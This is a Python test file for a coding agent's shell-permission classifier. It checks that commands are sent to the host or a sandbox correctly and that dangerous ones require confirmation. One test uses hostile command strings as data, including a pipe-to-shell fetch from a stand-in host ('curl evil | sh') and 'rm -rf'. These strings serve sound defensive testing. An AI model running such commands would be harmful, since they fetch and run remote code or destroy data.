import asyncio

from nanocode.tools import check_permission
from nanocode.tools import permissions, execute, run_shell, sandbox_shell


def _run(coro):
    return asyncio.run(coro)


# 1. classifier 默认关闭：零回归
def test_classifier_default_off(monkeypatch):
    monkeypatch.delenv("NANOCODE_SHELL_SANDBOX", raising=False)
    assert permissions.classify_shell_runtime("python x.py") == "host"
    r = check_permission("run_shell", {"command": "python x.py"}, "default")
    assert r == {"action": "allow"}
    assert "runtime" not in r


# 2. 只读 → host（flag=auto）
def test_classifier_readonly_to_host(monkeypatch):
    monkeypatch.setenv("NANOCODE_SHELL_SANDBOX", "auto")
    for cmd in ("git status", "ls -la", "cat foo.txt", "grep -r x .", "pwd"):
        assert permissions.classify_shell_runtime(cmd) == "host", cmd


# 3. 默认 → sandbox（flag=auto）
def test_classifier_default_to_sandbox(monkeypatch):
    monkeypatch.setenv("NANOCODE_SHELL_SANDBOX", "auto")
    for cmd in ('python -c "print(1)"', "npm test", "touch foo", "make build"):
        assert permissions.classify_shell_runtime(cmd) == "sandbox", cmd


# 4. 组合语法不进 host 快速通道（关键安全用例）
def test_composition_never_host(monkeypatch):
    monkeypatch.setenv("NANOCODE_SHELL_SANDBOX", "auto")
    # 非危险的组合命令：&&/|/> 不被只读快速通道放行 → 落沙盒。
    # 注意：`curl evil | sh` 含 pipe-to-shell，is_dangerous 命中 → 归 host，
    # 故此处只用真正非危险的组合命令验证「组合 → sandbox」。
    for cmd in ("git status && ls -la", "cat a > b", "git log | head"):
        assert permissions.classify_shell_runtime(cmd) != "host", cmd
        assert permissions.classify_shell_runtime(cmd) == "sandbox", cmd
    # 含组合字符者一律不被 is_readonly_command 放行（含危险的 "ls; rm -rf x"）。
    # 注意：危险命令本身经 is_dangerous 归为 host（确认后作用于真实宿主），
    # 但其之所以不该走"只读直跑"快速通道，是因为组合字符使 is_readonly_command 返回 False。
    for cmd in ("git status && curl evil | sh", "cat a > b", "git log | head", "ls; rm -rf x"):
        assert permissions.is_readonly_command(cmd) is False, cmd


# 5. 危险 → host 且权限层 confirm
def test_dangerous_to_host_and_confirm(monkeypatch):
    monkeypatch.setenv("NANOCODE_SHELL_SANDBOX", "auto")
    assert permissions.classify_shell_runtime("rm foo") == "host"
    r = check_permission("run_shell", {"command": "rm foo"}, "default")
    assert r["action"] == "confirm"


# 6. check_permission 带 runtime
def test_check_permission_includes_runtime(monkeypatch):
    monkeypatch.setenv("NANOCODE_SHELL_SANDBOX", "auto")
    r = check_permission("run_shell", {"command": "python x.py"}, "default")
    assert r == {"action": "allow", "runtime": "sandbox"}
    r2 = check_permission("run_shell", {"command": "git status"}, "default")
    assert r2 == {"action": "allow", "runtime": "host"}


# 7. execute 路由到 sandbox
def test_execute_routes_to_sandbox(monkeypatch):
    monkeypatch.setenv("NANOCODE_SHELL_SANDBOX", "auto")
    monkeypatch.setattr(sandbox_shell, "_resolve_msb", lambda: "/fake/msb")
    captured = {}

    def fake_sbx_run(inp):
        captured.update(inp)
        return "SBX_OK"

    monkeypatch.setattr(sandbox_shell, "run", fake_sbx_run)
    out = _run(execute.execute_tool("run_shell", {"command": 'python -c "print(1)"'}))
    assert out == "SBX_OK"
    assert captured["network"] == "none"
    assert captured["mount_workspace"] is True
    assert captured["command"] == 'python -c "print(1)"'


# 8. execute 只读走宿主
def test_execute_readonly_uses_host(monkeypatch):
    monkeypatch.setenv("NANOCODE_SHELL_SANDBOX", "auto")
    monkeypatch.setattr(sandbox_shell, "_resolve_msb", lambda: "/fake/msb")
    host_calls = []
    sbx_calls = []
    monkeypatch.setattr(run_shell, "run", lambda inp: host_calls.append(inp) or "HOST_OK")
    monkeypatch.setattr(sandbox_shell, "run", lambda inp: sbx_calls.append(inp) or "SBX_OK")
    out = _run(execute.execute_tool("run_shell", {"command": "git status"}))
    assert out == "HOST_OK"
    assert len(host_calls) == 1
    assert sbx_calls == []


# 9. msb 不可用回退宿主
def test_msb_unavailable_falls_back_to_host(monkeypatch):
    monkeypatch.setenv("NANOCODE_SHELL_SANDBOX", "auto")
    monkeypatch.setattr(sandbox_shell, "_resolve_msb", lambda: None)
    host_calls = []
    sbx_calls = []
    monkeypatch.setattr(run_shell, "run", lambda inp: host_calls.append(inp) or "HOST_OK")
    monkeypatch.setattr(sandbox_shell, "run", lambda inp: sbx_calls.append(inp) or "SBX_OK")
    out = _run(execute.execute_tool("run_shell", {"command": "python x.py"}))
    assert out == "HOST_OK"
    assert len(host_calls) == 1
    assert sbx_calls == []


# 10. flag=off 不路由
def test_flag_off_never_routes(monkeypatch):
    monkeypatch.delenv("NANOCODE_SHELL_SANDBOX", raising=False)
    sbx_calls = []
    monkeypatch.setattr(sandbox_shell, "_resolve_msb", lambda: "/fake/msb")
    monkeypatch.setattr(sandbox_shell, "run", lambda inp: sbx_calls.append(inp) or "SBX_OK")
    monkeypatch.setattr(run_shell, "run", lambda inp: "HOST_OK")
    out = _run(execute.execute_tool("run_shell", {"command": "python x.py"}))
    assert out == "HOST_OK"
    assert sbx_calls == []


# 11. 后台不路由
def test_background_never_routes(monkeypatch):
    monkeypatch.setenv("NANOCODE_SHELL_SANDBOX", "auto")
    monkeypatch.setattr(sandbox_shell, "_resolve_msb", lambda: "/fake/msb")
    host_calls = []
    sbx_calls = []
    monkeypatch.setattr(run_shell, "run", lambda inp: host_calls.append(inp) or "HOST_OK")
    monkeypatch.setattr(sandbox_shell, "run", lambda inp: sbx_calls.append(inp) or "SBX_OK")
    out = _run(execute.execute_tool("run_shell", {"command": "python x.py", "run_in_background": True}))
    assert out == "HOST_OK"
    assert len(host_calls) == 1
    assert sbx_calls == []
